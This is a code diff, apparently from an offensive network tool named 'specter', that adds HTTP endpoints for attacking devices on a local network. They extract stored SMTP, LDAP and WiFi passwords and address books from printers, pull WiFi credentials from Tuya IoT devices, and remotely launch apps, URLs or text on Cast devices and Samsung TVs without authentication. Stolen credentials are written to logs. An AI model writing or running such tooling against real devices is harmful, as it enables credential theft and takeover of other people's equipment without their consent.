@@ -790,6 +790,138 @@ async def tv_action(req: TVRequest):
             return {"status": "error", "message": f"Unknown action: {req.action}"}
 
 
+# --- Exploits ---
+
+class ExploitRequest(BaseModel):
+    target_ip: str
+    action: str = "auto"
+    params: dict = {}
+
+
+@app.post("/api/exploit/printer")
+async def exploit_printer_endpoint(target_ip: str = Query(...)):
+    """Exploit a printer — extract stored credentials and address book."""
+    from specter.modules.printer import exploit_printer
+
+    add_log("attack", f"Exploiting printer at {target_ip}...")
+    creds = exploit_printer(target_ip)
+
+    result = {
+        "ip": target_ip,
+        "model": creds.printer_model,
+        "serial": creds.serial_number,
+        "firmware": creds.firmware,
+        "smtp": {"server": creds.smtp_server, "port": creds.smtp_port,
+                 "username": creds.smtp_username, "password": creds.smtp_password,
+                 "sender": creds.smtp_sender},
+        "ldap": {"server": creds.ldap_server, "port": creds.ldap_port,
+                 "username": creds.ldap_username, "password": creds.ldap_password,
+                 "base_dn": creds.ldap_base_dn},
+        "wifi": {"ssid": creds.wifi_ssid, "password": creds.wifi_password,
+                 "security": creds.wifi_security},
+        "address_book": creds.address_book,
+    }
+
+    # Log findings
+    if creds.smtp_username:
+        add_log("cred", f"SMTP credentials: {creds.smtp_username}:{creds.smtp_password or '***'} @ {creds.smtp_server}")
+    if creds.wifi_ssid:
+        add_log("cred", f"WiFi: {creds.wifi_ssid} / {creds.wifi_password or '(hidden)'}")
+    if creds.address_book:
+        add_log("success", f"Address book: {len(creds.address_book)} entries")
+    if not any([creds.smtp_username, creds.wifi_ssid, creds.address_book]):
+        add_log("info", f"Printer {creds.printer_model or target_ip}: no credentials found in exposed pages")
+
+    return result
+
+
+@app.post("/api/exploit/tuya")
+async def exploit_tuya_endpoint(target_ip: str = Query(...)):
+    """Exploit a Tuya IoT device — extract WiFi credentials."""
+    from specter.modules.tuya import probe_tuya_device, extract_wifi_credentials
+
+    add_log("attack", f"Probing Tuya device at {target_ip}...")
+
+    # Try WiFi extraction
+    wifi = extract_wifi_credentials(target_ip)
+
+    # Also probe for device info
+    device = probe_tuya_device(target_ip)
+
+    result = {
+        "ip": target_ip,
+        "device_id": device.device_id if device else "",
+        "version": device.version if device else "",
+        "wifi_ssid": wifi.get("ssid", ""),
+        "wifi_password": wifi.get("password", ""),
+        "raw_device": device.raw_data if device else {},
+        "raw_wifi": wifi,
+    }
+
+    if wifi.get("ssid"):
+        add_log("cred", f"WiFi credentials extracted: {wifi['ssid']} / {wifi.get('password', '(encrypted)')}")
+    elif wifi.get("error"):
+        add_log("warning", f"Tuya probe: {wifi['error']}")
+    else:
+        add_log("info", "Tuya device responded but WiFi creds not directly accessible")
+
+    return result
+
+
+@app.post("/api/exploit/cast-launch")
+async def cast_launch_endpoint(target_ip: str = Query(...), app: str = Query("youtube"), video_id: str = Query("")):
+    """Launch an app on a Cast device via DIAL protocol (NO AUTH)."""
+    from specter.modules.google_cast import GoogleCastModule, CastDevice
+
+    device = CastDevice(ip=target_ip)
+    module = GoogleCastModule(device)
+
+    match app.lower():
+        case "youtube":
+            success = module.dial_launch_youtube(video_id)
+            add_log("attack", f"Launched YouTube on {target_ip}" + (f" (video: {video_id})" if video_id else ""))
+        case "netflix":
+            success = module.dial_launch_netflix()
+            add_log("attack", f"Launched Netflix on {target_ip}")
+        case "url":
+            success = module.dial_launch_url(video_id)  # reuse video_id param for URL
+            add_log("attack", f"Cast URL to {target_ip}: {video_id}")
+        case "stop":
+            success = module.dial_stop_app(video_id or "YouTube")
+            add_log("info", f"Stopped app on {target_ip}")
+        case _:
+            return {"status": "error", "message": f"Unknown app: {app}"}
+
+    return {"status": "ok" if success else "failed", "app": app}
+
+
+@app.post("/api/exploit/tv-launch")
+async def tv_launch_endpoint(target_ip: str = Query(...), action: str = Query("browser"), url: str = Query("")):
+    """Launch apps or open URLs on a Samsung TV."""
+    from specter.modules.samsung_tv import SamsungTVModule, SamsungTV
+
+    device = SamsungTV(ip=target_ip)
+    module = SamsungTVModule(device)
+
+    match action:
+        case "browser":
+            success = module.open_browser(url)
+            add_log("attack", f"Opened browser on TV {target_ip}: {url}")
+        case "youtube":
+            success = module.launch_youtube(url)  # url = video_id here
+            add_log("attack", f"Launched YouTube on TV {target_ip}")
+        case "apps":
+            apps = module.get_installed_apps()
+            return {"status": "ok", "apps": apps}
+        case "text":
+            success = module.send_text(url)  # url = text to send
+            add_log("attack", f"Sent text to TV: {url[:50]}")
+        case _:
+            return {"status": "error", "message": f"Unknown action: {action}"}
+
+    return {"status": "ok" if success else "failed"}
+
+
 # --- WebSocket ---
 
 @app.websocket("/ws")
